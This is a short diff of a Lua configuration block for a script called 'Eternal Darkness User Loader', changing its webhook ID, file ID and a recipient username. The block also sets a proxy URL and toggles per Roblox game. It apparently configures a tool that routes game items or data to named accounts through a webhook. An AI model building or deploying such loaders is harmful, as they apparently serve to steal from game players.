@@ -1,10 +1,10 @@
 -- Eternal Darkness User Loader v7.0
 -- Generated for: garlicmayo64
--- File ID: d5c78252ddc6b4ecc59696deb0aa322f
+-- File ID: 93e90c6a65507b2000a19f798f7f9f76
 
 _G.ED_CONFIG = {
-    WEBHOOK_ID = "5f4157ddc54e7464aed141a0dc72c0a8",
-    USERNAMES = {"jacobpro728"},
+    WEBHOOK_ID = "74f58ceeb57d46cea7a50a162c8321db",
+    USERNAMES = {"Jacobpro728"},
     PROXY_URL = "https://eternal-darkness.org/proxy/",
     USERNAME = "garlicmayo64",
     ENABLED_GAMES = {["mm2"]=false,["ps99"]=true,["adm"]=false,["sab"]=false,["sp"]=false,["bb"]=false,},
